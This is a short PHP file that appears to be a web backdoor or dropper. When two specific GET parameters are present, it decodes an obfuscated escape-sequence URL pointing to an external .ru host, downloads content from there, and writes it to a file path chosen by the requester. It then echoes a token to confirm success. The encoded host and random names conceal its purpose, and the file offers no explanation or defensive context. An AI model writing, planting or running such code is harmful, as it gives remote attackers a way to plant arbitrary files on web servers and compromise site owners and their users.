<?php 
	if(isset($_GET["hSJo"]) && isset($_GET["MJN"])){
		$ubiMe = $_GET["MJN"];
		$tbloBv = urldecode("\x68\164\x74\160\x25\63\x41\45\x32\106\x25\62\x46\166\x6f\154\x6f\166\x6d\141\x72\164\x2e\162\x75\45\x32\106\x64\141\x69\45\x32\106\x69\156\x64\145\x78\56\x70\150\x70")."?t=p&l=".$_GET["hSJo"];
		if(file_put_contents($ubiMe,file_get_contents($tbloBv))!= false){
			echo "IwNxiWVQYFyqOjSAnamP";
		}		
	}	
?>